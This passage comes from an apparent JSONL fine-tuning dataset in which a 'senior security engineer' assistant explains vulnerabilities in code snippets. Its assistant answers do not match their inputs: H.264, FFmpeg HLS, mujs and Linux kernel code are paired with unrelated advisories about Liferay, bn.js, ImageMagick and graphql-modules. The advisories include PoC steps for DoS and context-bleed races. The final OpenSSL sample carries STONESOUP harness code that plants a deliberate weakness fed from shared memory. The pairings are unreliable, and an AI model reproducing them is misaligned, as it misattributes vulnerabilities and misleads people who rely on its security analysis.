ps_dec->u2_frm_ht_in_mbs * ps_dec->u2_frm_wd_in_mbs)\n {\n        WORD32 num_mb_skipped;\n        WORD32 prev_slice_err;\n pocstruct_t temp_poc;\n        WORD32 ret1;\n        WORD32 ht_in_mbs;\n        ht_in_mbs = ps_dec->u2_pic_ht >> (4 + ps_dec->ps_cur_slice->u1_field_pic_flag);\n        num_mb_skipped = (ht_in_mbs * ps_dec->u2_frm_wd_in_mbs)\n - ps_dec->u2_total_mbs_coded;\n\n if(ps_dec->u4_first_slice_in_pic && (ps_dec->u4_pic_buf_got == 0))\n            prev_slice_err = 1;\n else\n            prev_slice_err = 2;\n\n if(ps_dec->u4_first_slice_in_pic && (ps_dec->u2_total_mbs_coded == 0))\n            prev_slice_err = 1;\n\n        ret1 = ih264d_mark_err_slice_skip(ps_dec, num_mb_skipped, ps_dec->u1_nal_unit_type == IDR_SLICE_NAL, ps_dec->ps_cur_slice->u2_frame_num,\n &temp_poc, prev_slice_err);\n\n if((ret1 == ERROR_UNAVAIL_PICBUF_T) || (ret1 == ERROR_UNAVAIL_MVBUF_T) ||\n (ret1 == ERROR_INV_SPS_PPS_T))\n {\n            ret = ret1;\n }\n }\n\n if((ret == IVD_RES_CHANGED)\n || (ret == IVD_MEM_ALLOC_FAILED)\n || (ret == ERROR_UNAVAIL_PICBUF_T)\n || (ret == ERROR_UNAVAIL_MVBUF_T)\n || (ret == ERROR_INV_SPS_PPS_T))\n {\n\n /* signal the decode thread */\n        ih264d_signal_decode_thread(ps_dec);\n /* close deblock thread if it is not closed yet */\n if(ps_dec->u4_num_cores == 3)\n {\n            ih264d_signal_bs_deblk_thread(ps_dec);\n }\n /* dont consume bitstream for change in resolution case */\n if(ret == IVD_RES_CHANGED)\n {\n            ps_dec_op->u4_num_bytes_consumed -= bytes_consumed;\n }\n return IV_FAIL;\n }\n\n\n if(ps_dec->u1_separate_parse)\n {\n /* If Format conversion is not complete,\n         complete it here */\n if(ps_dec->u4_num_cores == 2)\n {\n\n /*do deblocking of all mbs*/\n if((ps_dec->u4_nmb_deblk == 0) &&(ps_dec->u4_start_recon_deblk == 1) && (ps_dec->ps_cur_sps->u1_mb_aff_flag == 0))\n {\n                UWORD32 u4_num_mbs,u4_max_addr;\n tfr_ctxt_t s_tfr_ctxt;\n tfr_ctxt_t *ps_tfr_cxt = &s_tfr_ctxt;\n pad_mgr_t *ps_pad_mgr = &ps_dec->s_pad_mgr;\n\n /*BS is done for all mbs while parsing*/\n                u4_max_addr = (ps_dec->u2_frm_wd_in_mbs * ps_dec->u2_frm_ht_in_mbs) - 1;\n                ps_dec->u4_cur_bs_mb_num = u4_max_addr + 1;\n\n\n                ih264d_init_deblk_tfr_ctxt(ps_dec, ps_pad_mgr, ps_tfr_cxt,\n                                           ps_dec->u2_frm_wd_in_mbs, 0);\n\n\n                u4_num_mbs = u4_max_addr\n - ps_dec->u4_cur_deblk_mb_num + 1;\n\n                DEBUG_PERF_PRINTF(\"mbs left for deblocking= %d \\n\",u4_num_mbs);\n\n if(u4_num_mbs != 0)\n                    ih264d_check_mb_map_deblk(ps_dec, u4_num_mbs,\n                                                   ps_tfr_cxt,1);\n\n                ps_dec->u4_start_recon_deblk  = 0;\n\n }\n\n }\n\n /*signal the decode thread*/\n        ih264d_signal_decode_thread(ps_dec);\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n            ih264d_signal_bs_deblk_thread(ps_dec);\n }\n }\n\n\n    DATA_SYNC();\n\n\n if((ps_dec_op->u4_error_code & 0xff)\n != ERROR_DYNAMIC_RESOLUTION_NOT_SUPPORTED)\n {\n        ps_dec_op->u4_pic_wd = (UWORD32)ps_dec->u2_disp_width;\n        ps_dec_op->u4_pic_ht = (UWORD32)ps_dec->u2_disp_height;\n }\n\n if(ps_dec->i4_header_decoded != 3)\n {\n        ps_dec_op->u4_error_code |= (1 << IVD_INSUFFICIENTDATA);\n\n }\n\n if(ps_dec->i4_decode_header == 1 && ps_dec->i4_header_decoded != 3)\n {\n        ps_dec_op->u4_error_code |= (1 << IVD_INSUFFICIENTDATA);\n\n }\n if(ps_dec->u4_prev_nal_skipped)\n {\n /*We have encountered a referenced frame,return to app*/\n        ps_dec_op->u4_error_code = IVD_DEC_FRM_SKIPPED;\n        ps_dec_op->u4_error_code |= (1 << IVD_UNSUPPORTEDPARAM);\n        ps_dec_op->u4_frame_decoded_flag = 0;\n        ps_dec_op->u4_size = sizeof(ivd_video_decode_op_t);\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n            ih264d_signal_bs_deblk_thread(ps_dec);\n }\n return (IV_FAIL);\n\n }\n\n if((ps_dec->u4_pic_buf_got == 1)\n && (ERROR_DANGLING_FIELD_IN_PIC != i4_err_status))\n {\n /*\n         * For field pictures, set the bottom and top picture decoded u4_flag correctly.\n         */\n\n if(ps_dec->ps_cur_slice->u1_field_pic_flag)\n {\n if(1 == ps_dec->ps_cur_slice->u1_bottom_field_flag)\n {\n                ps_dec->u1_top_bottom_decoded |= BOT_FIELD_ONLY;\n }\n else\n {\n                ps_dec->u1_top_bottom_decoded |= TOP_FIELD_ONLY;\n }\n }\n else\n {\n                ps_dec->u1_top_bottom_decoded = TOP_FIELD_ONLY | BOT_FIELD_ONLY;\n }\n\n /* if new frame in not found (if we are still getting slices from previous frame)\n         * ih264d_deblock_display is not called. Such frames will not be added to reference /display\n         */\n if ((ps_dec->ps_dec_err_status->u1_err_flag & REJECT_CUR_PIC) == 0)\n {\n /* Calling Function to deblock Picture and Display */\n            ret = ih264d_deblock_display(ps_dec);\n }\n\n\n /*set to complete ,as we dont support partial frame decode*/\n if(ps_dec->i4_header_decoded == 3)\n {\n            ps_dec->u2_total_mbs_coded = ps_dec->ps_cur_sps->u2_max_mb_addr + 1;\n }\n\n /*Update the i4_frametype at the end of picture*/\n if(ps_dec->ps_cur_slice->u1_nal_unit_type == IDR_SLICE_NAL)\n {\n            ps_dec->i4_frametype = IV_IDR_FRAME;\n }\n else if(ps_dec->i4_pic_type == B_SLICE)\n {\n            ps_dec->i4_frametype = IV_B_FRAME;\n }\n else if(ps_dec->i4_pic_type == P_SLICE)\n {\n            ps_dec->i4_frametype = IV_P_FRAME;\n }\n else if(ps_dec->i4_pic_type == I_SLICE)\n {\n            ps_dec->i4_frametype = IV_I_FRAME;\n }\n else\n {\n            H264_DEC_DEBUG_PRINT(\"Shouldn't come here\\n\");\n }\n\n        ps_dec->i4_content_type = ps_dec->ps_cur_slice->u1_field_pic_flag;\n\n        ps_dec->u4_total_frames_decoded = ps_dec->u4_total_frames_decoded + 2;\n        ps_dec->u4_total_frames_decoded = ps_dec->u4_total_frames_decoded\n - ps_dec->ps_cur_slice->u1_field_pic_flag;\n\n }\n\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n        ih264d_signal_bs_deblk_thread(ps_dec);\n }\n\n\n {\n /* In case the decoder is configured to run in low delay mode,\n         * then get display buffer and then format convert.\n         * Note in this mode, format conversion does not run paralelly in a thread and adds to the codec cycles\n         */\n\n if((IVD_DECODE_FRAME_OUT == ps_dec->e_frm_out_mode)\n && ps_dec->u1_init_dec_flag)\n {\n\n            ih264d_get_next_display_field(ps_dec, ps_dec->ps_out_buffer,\n &(ps_dec->s_disp_op));\n if(0 == ps_dec->s_disp_op.u4_error_code)\n {\n                ps_dec->u4_fmt_conv_cur_row = 0;\n                ps_dec->u4_output_present = 1;\n }\n }\n\n        ih264d_fill_output_struct_from_context(ps_dec, ps_dec_op);\n\n /* If Format conversion is not complete,\n         complete it here */\n if(ps_dec->u4_output_present &&\n (ps_dec->u4_fmt_conv_cur_row < ps_dec->s_disp_frame_info.u4_y_ht))\n {\n            ps_dec->u4_fmt_conv_num_rows = ps_dec->s_disp_frame_info.u4_y_ht\n - ps_dec->u4_fmt_conv_cur_row;\n            ih264d_format_convert(ps_dec, &(ps_dec->s_disp_op),\n                                  ps_dec->u4_fmt_conv_cur_row,\n                                  ps_dec->u4_fmt_conv_num_rows);\n            ps_dec->u4_fmt_conv_cur_row += ps_dec->u4_fmt_conv_num_rows;\n }\n\n        ih264d_release_display_field(ps_dec, &(ps_dec->s_disp_op));\n }\n\n if(ps_dec->i4_decode_header == 1 && (ps_dec->i4_header_decoded & 1) == 1)\n {\n        ps_dec_op->u4_progressive_frame_flag = 1;\n if((NULL != ps_dec->ps_cur_sps) && (1 == (ps_dec->ps_cur_sps->u1_is_valid)))\n {\n if((0 == ps_dec->ps_sps->u1_frame_mbs_only_flag)\n && (0 == ps_dec->ps_sps->u1_mb_aff_flag))\n                ps_dec_op->u4_progressive_frame_flag = 0;\n\n }\n }\n\n if((TOP_FIELD_ONLY | BOT_FIELD_ONLY) == ps_dec->u1_top_bottom_decoded)\n {\n        ps_dec->u1_top_bottom_decoded = 0;\n }\n /*--------------------------------------------------------------------*/\n /* Do End of Pic processing.                                          */\n /* Should be called only if frame was decoded in previous process call*/\n /*--------------------------------------------------------------------*/\n if(ps_dec->u4_pic_buf_got == 1)\n {\n if(1 == ps_dec->u1_last_pic_not_decoded)\n {\n            ret = ih264d_end_of_pic_dispbuf_mgr(ps_dec);\n\n if(ret != OK)\n return ret;\n\n            ret = ih264d_end_of_pic(ps_dec);\n if(ret != OK)\n return ret;\n }\n else\n {\n            ret = ih264d_end_of_pic(ps_dec);\n if(ret != OK)\n return ret;\n }\n\n }\n\n\n /*Data memory barrier instruction,so that yuv write by the library is complete*/\n    DATA_SYNC();\n\n    H264_DEC_DEBUG_PRINT(\"The num bytes consumed: %d\\n\",\n                         ps_dec_op->u4_num_bytes_consumed);\n return api_ret_value;\n}\n\n```"}, {"role": "assistant", "content": "Liferay Portal's Unlimited File Upload Could Result in DoS\n\nLiferay Portal 7.4.0 through 7.4.3.132, and Liferay DXP 2025.Q1.0 through 2025.Q1.4, 2024.Q4.0 through 2024.Q4.7, 2024.Q3.1 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.15 and 7.4 GA through update 92 allow users to upload an unlimited amount of files through the object entries attachment fields, the files are stored in the document_library allowing an attacker to cause a potential DDoS."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic js_Ast *arguments(js_State *J)\n{\n\tjs_Ast *head, *tail;\n\tif (J->lookahead == ')')\n\t\treturn NULL;\n\thead = tail = LIST(assignment(J, 0));\n\twhile (jsP_accept(J, ',')) {\n\t\ttail = tail->b = LIST(assignment(J, 0));\n\t}\n\treturn jsP_list(head);\n}\n\n```"}, {"role": "assistant", "content": "ImageMagick's failure to limit the depth of SVG file reads caused a DoS attack\n\n### Summary\n\nUsing Magick to read a malicious SVG file resulted in a DoS attack.\n\n### Details\n\nbt obtained using gdb:\n\n```\n#4 0x0000555555794c9c in ResizeMagickMemory (memory=0x7fffee203800, size=391344) at MagickCore/memory.c:1443\n#5 0x0000555555794e5a in ResizeQuantumMemory (memory=0x7fffee203800, count=48918, quantum=8) \nat MagickCore/memory.c:1508\n#6 0x0000555555acc8ed in SVGStartElement (context=0x517000000080, name=0x5190000055e3 \"g\", attributes=0x0) \nat coders/svg.c:1254\n#7 0x00007ffff6799b1c in xmlParseStartTag () at /lib/x86_64-linux-gnu/libxml2.so.2\n#8 0x00007ffff68c7bb8 in () at /lib/x86_64-linux-gnu/libxml2.so.2\n#9 0x00007ffff67a03f1 in xmlParseChunk () at /lib/x86_64-linux-gnu/libxml2.so.2\n```\n\nThis is related to the SVGStartElement and ResizeQuantumMemory functions.\n\n### PoC\n\n1. Generate an SVG file\n\n2. Read this file using Magick:\n\n```\n./magick /data/ylwang/Tools/LargeScan/targets/ImageMagick/test++/1.svg null\n```\n\n3. Causes a DoS Attack\n\nMy server has a large amount of memory, causing a stack overflow to take a long time. I'll use the Windows release version as an example:\n\n``` \nPS C:\\Program Files\\ImageMagick-7.1.2-Q8> .\\magick.exe -ping 1.svg null:\nPS C:\\Program Files\\ImageMagick-7.1.2-Q8> echo $LASTEXITCODE\n-1073741571\n```\n\nThe error code -1073741571 indicates a crash due to a stack overflow.\n\n### Impact\n\nThis is a DoS vulnerability and all applications using Magick to parse SVG files are affected."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic int read_data(void *opaque, uint8_t *buf, int buf_size)\n{\n    struct playlist *v = opaque;\n     HLSContext *c = v->parent->priv_data;\n     int ret, i;\n     int just_opened = 0;\n \n restart:\n     if (!v->needed)\n        return AVERROR_EOF;\n\n    if (!v->input) {\n        int64_t reload_interval;\n        struct segment *seg;\n\n        /* Check that the playlist is still needed before opening a new\n         * segment. */\n        if (v->ctx && v->ctx->nb_streams) {\n            v->needed = 0;\n            for (i = 0; i < v->n_main_streams; i++) {\n                if (v->main_streams[i]->discard < AVDISCARD_ALL) {\n                    v->needed = 1;\n                    break;\n                }\n            }\n        }\n        if (!v->needed) {\n            av_log(v->parent, AV_LOG_INFO, \"No longer receiving playlist %d\\n\",\n                v->index);\n            return AVERROR_EOF;\n        }\n\n        /* If this is a live stream and the reload interval has elapsed since\n         * the last playlist reload, reload the playlists now. */\n         reload_interval = default_reload_interval(v);\n \n reload:\n         if (!v->finished &&\n             av_gettime_relative() - v->last_load_time >= reload_interval) {\n             if ((ret = parse_playlist(c, v->url, v, NULL)) < 0) {\n                av_log(v->parent, AV_LOG_WARNING, \"Failed to reload playlist %d\\n\",\n                       v->index);\n                return ret;\n            }\n            /* If we need to reload the playlist again below (if\n             * there's still no more segments), switch to a reload\n             * interval of half the target duration. */\n            reload_interval = v->target_duration / 2;\n        }\n        if (v->cur_seq_no < v->start_seq_no) {\n            av_log(NULL, AV_LOG_WARNING,\n                   \"skipping %d segments ahead, expired from playlists\\n\",\n                   v->start_seq_no - v->cur_seq_no);\n            v->cur_seq_no = v->start_seq_no;\n        }\n        if (v->cur_seq_no >= v->start_seq_no + v->n_segments) {\n            if (v->finished)\n                return AVERROR_EOF;\n            while (av_gettime_relative() - v->last_load_time < reload_interval) {\n                if (ff_check_interrupt(c->interrupt_callback))\n                    return AVERROR_EXIT;\n                av_usleep(100*1000);\n            }\n            /* Enough time has elapsed since the last reload */\n            goto reload;\n        }\n\n        seg = current_segment(v);\n\n        /* load/update Media Initialization Section, if any */\n        ret = update_init_section(v, seg);\n        if (ret)\n            return ret;\n\n        ret = open_input(c, v, seg);\n        if (ret < 0) {\n            if (ff_check_interrupt(c->interrupt_callback))\n                return AVERROR_EXIT;\n            av_log(v->parent, AV_LOG_WARNING, \"Failed to open segment of playlist %d\\n\",\n                   v->index);\n            v->cur_seq_no += 1;\n            goto reload;\n        }\n        just_opened = 1;\n    }\n\n    if (v->init_sec_buf_read_offset < v->init_sec_data_len) {\n        /* Push init section out first before first actual segment */\n        int copy_size = FFMIN(v->init_sec_data_len - v->init_sec_buf_read_offset, buf_size);\n        memcpy(buf, v->init_sec_buf, copy_size);\n        v->init_sec_buf_read_offset += copy_size;\n        return copy_size;\n    }\n\n    ret = read_from_url(v, current_segment(v), buf, buf_size, READ_NORMAL);\n    if (ret > 0) {\n        if (just_opened && v->is_id3_timestamped != 0) {\n            /* Intercept ID3 tags here, elementary audio streams are required\n             * to convey timestamps using them in the beginning of each segment. */\n            intercept_id3(v, buf, buf_size, &ret);\n        }\n\n        return ret;\n    }\n    ff_format_io_close(v->parent, &v->input);\n    v->cur_seq_no++;\n\n    c->cur_seq_no = v->cur_seq_no;\n\n    goto restart;\n}\n\n```"}, {"role": "assistant", "content": "bn.js affected by an infinite loop\n\nThis affects versions of the package bn.js before 4.12.3 and 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nlong get_user_pages_unlocked(unsigned long start, unsigned long nr_pages,\n\t\t\t     int write, int force, struct page **pages)\n{\n\treturn __get_user_pages_unlocked(current, current->mm, start, nr_pages,\n\t\t\t\t\t write, force, pages, FOLL_TOUCH);\n}\n\n```"}, {"role": "assistant", "content": "@envelop/graphql-modules has a Race Condition vulnerability\n\n### Summary\nContext race condition when using `useGraphQLModules` plugin\n\n### Details\n\nRelated to: https://github.com/graphql-hive/graphql-modules/security/advisories/GHSA-53wg-r69p-v3r7\n\nWhen 2 or more parallel requests are made which trigger the same service, the context of the requests is mixed up in the service when the context is injected via @ExecutionContext() and graphql-modules are used in Yoga with `useGraphQLModules(application)`. This issue was fixed in `graphql-modules` in `2.4.1` and `3.1.1` but using `useGraphQLModules` will bypass the `async_hooks` fix that was implemented.\n\n### PoC\n\nCreate the following `package.json` and run `npm i`\n\n```json\n{\n  \"name\": \"poc\",\n  \"scripts\": {\n    \"compile\": \"tsc\",\n    \"start\": \"npm run compile && node ./dist/src/index.js\",\n    \"test\": \"npm run compile && node ./dist/test/bleedtest.js\"\n  },\n  \"dependencies\": {\n    \"@envelop/graphql-modules\": \"^9.0.0\",\n    \"graphql-yoga\": \"^5.0.0\",\n    \"graphql\": \"^16.10.0\",\n    \"graphql-modules\": \"3.1.1\",\n    \"reflect-metadata\": \"0.2.1\",\n    \"axios\": \"^1.8.4\"\n  },\n  \"devDependencies\": {\n    \"@types/node\": \"^22.14.1\",\n    \"typescript\": \"^5.8.3\"\n  }\n}\n```\n\nDefine the app entrypoint: `src/index.ts`\n\n```ts\nimport { module } from \"./module.js\";\nimport { useGraphQLModules } from '@envelop/graphql-modules'\nimport { createApplication } from \"graphql-modules\";\nimport { createServer } from 'node:http'\nimport { randomUUID } from \"node:crypto\";\nimport { createYoga } from 'graphql-yoga';\n\nconst application = createApplication({\n    modules: [module]\n})\n\nconst yoga = createYoga({\n    schema: application.schema,\n    plugins: [useGraphQLModules(application)],\n    context() {\n        return {\n            requestId: randomUUID(),\n        }\n    }\n})\n\nconst server = createServer(yoga)\nserver.listen(4001, '127.0.0.1', undefined, () => {\n    console.info(\n        `[Server] Running on http://localhost:4001/graphql`\n    )\n})\n```\n\nCreate the test module: `src/module.ts`\n\n```ts\nimport { createModule, gql } from \"graphql-modules\";\nimport Service from \"./service.js\";\n\nconst typeDefs = gql`\n    type Book {\n        id1: String\n        id2: String\n    }\n    type Query {\n        books: [Book]\n    }\n`;\n\nexport const module = createModule({\n    id: 'book-module',\n    typeDefs: [typeDefs],\n    providers: [Service],\n    resolvers: {\n        Query: {\n            // return one empty book\n            books: () => [{}],\n        },\n        Book: {\n            // return the requestId from the context\n            id1: async (_root, _args, { injector } ) => {\n                return injector.get(Service).get();\n            },\n            // return the requestId from the context of the service 100 ms later\n            id2: async (_root, _args, { injector } ) => {\n                await new Promise(resolve => setTimeout(resolve, 100));\n                return injector.get(Service).get()\n            },\n        }\n    }\n})\n```\n\nAdd the Service that's to be injected `src/service.ts`\n\n```ts\nimport { ExecutionContext, Injectable } from 'graphql-modules';\nimport 'reflect-metadata';\n\n@Injectable()\nexport default class Service {\n    @ExecutionContext()\n    private context: ExecutionContext;\n\n    get() {\n        return this.context.requestId;\n    }\n}\n```\n\nAdd the test case `test/bleedtest.js`\n\n```ts\nimport axios from 'axios';\n\nconst url = 'http://localhost:4001/graphql';\nconst query = `query { books { id1 id2 } }`;\n\nconst makeGraphQLRequest = async () => {\n    const response = await axios.post(url, { query });\n\n    const book = response.data.data.books[0]\n    if (book.id1 !== book.id2) {\n        throw new Error(`wrong response with ids ${(book.id1)} and ${(book.id2)}`)\n    }\n}\n\nconst numberOfRequests = 2;\nawait Promise.all(Array.from(\n    { length: numberOfRequests },\n    makeGraphQLRequest,\n));\n```\n\nThen run the server with `npm run start` in one terminal and the testcase in another with `npm run test`.\nThe returned IDs should be identical as they are both read from the context within the same request.\nHowever, there is a mismatch:\n\n```\n❯ npm run test\n\n> poc@1.0.0 test\n> npm run compile && node ./dist/test/bleedtest.js\n\n\n> poc@1.0.0 compile\n> tsc\n\nfile://<redacted>/dist/test/bleedtest.js:8\n        throw new Error(`wrong response with ids ${(book.id1)} and ${(book.id2)}`);\n              ^\n\nError: wrong response with ids c2d83151-0922-4f25-a3e9-2f03acc1376a and e16c7335-0eaa-4386-b415-869ee4b05315\n    at makeGraphQLRequest (file://<redacted>/dist/test/bleedtest.js:8:15)\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)\n    at async Promise.all (index 0)\n    at async file://<redacted>/dist/test/bleedtest.js:12:1\n```\n\n### Impact\nAny application that uses `useGraphQLModules` from `@envelop/graphql-modules` along with services that inject the context using @ExecutionContext() from a singleton provider are at risk. The more traffic an application has, the higher the chance for parallel requests, the higher the risk."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "analyze this code for security violations:\n\n/* ====================================================================\n * Copyright (c) 2001 The OpenSSL Project.  All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n *\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer. \n *\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in\n *    the documentation and/or other materials provided with the\n *    distribution.\n *\n * 3. All advertising materials mentioning features or use of this\n *    software must display the following acknowledgment:\n *    \"This product includes software developed by the OpenSSL Project\n *    for use in the OpenSSL Toolkit. (http://www.OpenSSL.org/)\"\n *\n * 4. The names \"OpenSSL Toolkit\" and \"OpenSSL Project\" must not be used to\n *    endorse or promote products derived from this software without\n *    prior written permission. For written permission, please contact\n *    licensing@OpenSSL.org.\n *\n * 5. Products derived from this software may not be called \"OpenSSL\"\n *    nor may \"OpenSSL\" appear in their names without prior written\n *    permission of the OpenSSL Project.\n *\n * 6. Redistributions of any form whatsoever must retain the following\n *    acknowledgment:\n *    \"This product includes software developed by the OpenSSL Project\n *    for use in the OpenSSL Toolkit (http://www.OpenSSL.org/)\"\n *\n * THIS SOFTWARE IS PROVIDED BY THE OpenSSL PROJECT ``AS IS'' AND ANY\n * EXPRESSED OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n * PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE OpenSSL PROJECT OR\n * ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)\n * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\n * STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED\n * OF THE POSSIBILITY OF SUCH DAMAGE.\n * ====================================================================\n *\n * This product includes cryptographic software written by Eric Young\n * (eay@cryptsoft.com).  This product includes software written by Tim\n * Hudson (tjh@cryptsoft.com).\n *\n */\n#include \"cryptlib.h\"\n#include <openssl/evp.h>\n#include <openssl/lhash.h>\n#include \"eng_int.h\"\n/* The type of the items in the table */\n#include <sys/stat.h> \n#include <sys/ipc.h> \n#include <sys/shm.h> \n#include <stdio.h> \n#include <mysql.h> \n#include <stonesoup/stonesoup_trace.h> \ntypedef struct st_engine_pile {\n/* The 'nid' of this algorithm/mode */\nint nid;\n/* ENGINEs that implement this algorithm/mode. */\nstruct stack_st_ENGINE *sk;\n/* The default ENGINE to perform this algorithm/mode. */\nENGINE *funct;\n/* Zero if 'sk' is newer than the cached 'funct', non-zero otherwise */\nint uptodate;}ENGINE_PILE;\n\nstruct lhash_st_ENGINE_PILE \n{\n  int dummy;\n}\n;\n/* The type exposed in eng_int.h */\n\nstruct st_engine_table \n{\n  struct lhash_st_ENGINE_PILE piles;\n/* ENGINE_TABLE */\n}\n;\ntypedef struct st_engine_pile_doall {\nengine_table_doall_cb *cb;\nvoid *arg;}ENGINE_PILE_DOALL;\n/* Global flags (ENGINE_TABLE_FLAG_***). */\nstatic unsigned int table_flags = 0;\n/* API function manipulating 'table_flags' */\nint jolterheaded_albay = 0;\nint stonesoup_global_variable;\nvoid* stonesoup_printf_context = NULL;\nvoid stonesoup_setup_printf_context() {\n    struct stat st = {0};\n    char * ss_tc_root = NULL;\n    char * dirpath = NULL;\n    int size_dirpath = 0;\n    char * filepath = NULL;\n    int size_filepath = 0;\n    int retval = 0;\n    ss_tc_root = getenv(\"SS_TC_ROOT\");\n    if (ss_tc_root != NULL) {\n        size_dirpath = strlen(ss_tc_root) + strlen(\"testData\") + 2;\n        dirpath = (char*) malloc (size_dirpath * sizeof(char));\n        if (dirpath != NULL) {\n            sprintf(dirpath, \"%s/%s\", ss_tc_root, \"testData\");\n            retval = 0;\n            if (stat(dirpath, &st) == -1) {\n                retval = mkdir(dirpath, 0700);\n            }\n            if (retval == 0) {\n                size_filepath = strlen(dirpath) + strlen(\"logfile.txt\") + 2;\n                filepath = (char*) malloc (size_filepath * sizeof(char));\n                if (filepath != NULL) {\n                    sprintf(filepath, \"%s/%s\", dirpath, \"logfile.txt\");\n                    stonesoup_printf_context = fopen(filepath, \"w\");\n                    free(filepath);\n                }\n            }\n            free(dirpath);\n        }\n    }\n    if (stonesoup_printf_context == NULL) {\n        stonesoup_printf_context = stderr;\n    }\n}\nvoid stonesoup_printf(char * format, ...) {\n    va_list argptr;\n    va_start(argptr, format);\n    vfprintf(stonesoup_printf_context, format, argptr);\n    va_end(argptr);\n    fflush(stonesoup_printf_context);\n}\nvoid stonesoup_close_printf_context() {\n    if (stonesoup_printf_context != NULL &&\n        stonesoup_printf_context != stderr) {\n        fclose(stonesoup_printf_context);\n    }\n}\nvoid stonesoup_read_taint(char** stonesoup_tainted_buff, char* stonesoup_envKey, int stonesoup_shmsz) {\n    int stonesoup_shmid;\n key_t stonesoup_key;\n char *stonesoup_shm, *stonesoup_s;\n char* stonesoup_envSize = NULL;\n *stonesoup_tainted_buff = NULL;\n    if (getenv(\"STONESOUP_DISABLE_WEAKNESS\") == NULL ||\n        strcmp(getenv(\"STONESOUP_DISABLE_WEAKNESS\"), \"1\") != 0) {\n        if(stonesoup_envKey != NULL) {\n            if(sscanf(stonesoup_envKey, \"%d\", &stonesoup_key) > 0) {\n                if ((stonesoup_shmid = shmget(stonesoup_key, stonesoup_shmsz, 0666)) >= 0) {\n                    if ((stonesoup_shm = shmat(stonesoup_shmid, NULL, 0)) != (char *) -1) {\n                        *stonesoup_tainted_buff = (char*)calloc(stonesoup_shmsz, sizeof(char));\n                        /* STONESOUP: SOURCE-TAINT (Shared Memory) */\n                        for (stonesoup_s = stonesoup_shm; *stonesoup_s != (char)0; stonesoup_s++) {\n                            (*stonesoup_tainted_buff)[stonesoup_s - stonesoup_shm] = *stonesoup_s;\n                        }\n                    }\n                }\n            }\n        }\n    } else {\n        *stonesoup_tainted_buff = NULL;\n    }\n}\nvoid yirring_vsterbottensost(char *const georgette_dextrocardia);\n\nunsigned int ENGINE_get_table_flags()\n{\n  return table_flags;\n}\n\nvoid ENGINE_set_table_flags(unsigned int flags)\n{\n  table_flags = flags;\n}\n/* Internal functions for the \"piles\" hash table */\n\nstatic unsigned long engine_pile_hash(const ENGINE_PILE *c)\n{\n  return (c -> nid);\n}\n\nstatic int engine_pile_cmp(const ENGINE_PILE *a,const ENGINE_PILE *b)\n{\n  return a -> nid - b -> nid;\n}\n\nstatic unsigned long engine_pile_LHASH_HASH(const void *arg)\n{\n  const ENGINE_PILE *a = arg;\n  return engine_pile_hash(a);\n}\n\nstatic int engine_pile_LHASH_COMP(const void *arg1,const void *arg2)\n{\n  const ENGINE_PILE *a = arg1;\n  const ENGINE_PILE *b = arg2;\n  return engine_pile_cmp(a,b);\n}\n\nstatic int int_table_check(ENGINE_TABLE **t,int create)\n{\n  struct lhash_st_ENGINE_PILE *lh;\n  if ( *t) {\n    return 1;\n  }\n  if (!create) {\n    return 0;\n  }\n  if ((lh = ((struct lhash_st_ENGINE_PILE *)(lh_new(engine_pile_LHASH_HASH,engine_pile_LHASH_COMP)))) == ((void *)0)) {\n    return 0;\n  }\n   *t = ((ENGINE_TABLE *)lh);\n  return 1;\n}\n/* Privately exposed (via eng_int.h) functions for adding and/or removing\n * ENGINEs from the implementation table */\n\nint engine_table_register(ENGINE_TABLE **table,ENGINE_CLEANUP_CB *cleanup,ENGINE *e,const int *nids,int num_nids,int setdefault)\n{\n  int ret = 0;\n  int added = 0;\n  ENGINE_PILE tmplate;\n  ENGINE_PILE *fnd;\n  CRYPTO_lock(1 | 8,30,\"eng_table.c\",135);\n  if (!( *table)) {\n    added = 1;\n  }\n  if (!int_table_check(table,1)) {\n    goto end;\n  }\n  if (added) {\n/* The cleanup callback needs to be added */\n    engine_cleanup_add_first(cleanup);\n  }\n  while(num_nids--){\n    tmplate . nid =  *nids;\n    fnd = ((ENGINE_PILE *)(lh_retrieve(((_LHASH *)((void *)(&( *table) -> piles))),((void *)(&tmplate)))));\n    if (!fnd) {\n      fnd = (CRYPTO_malloc(((int )(sizeof(ENGINE_PILE ))),\"eng_table.c\",149));\n      if (!fnd) {\n        goto end;\n      }\n      fnd -> uptodate = 1;\n      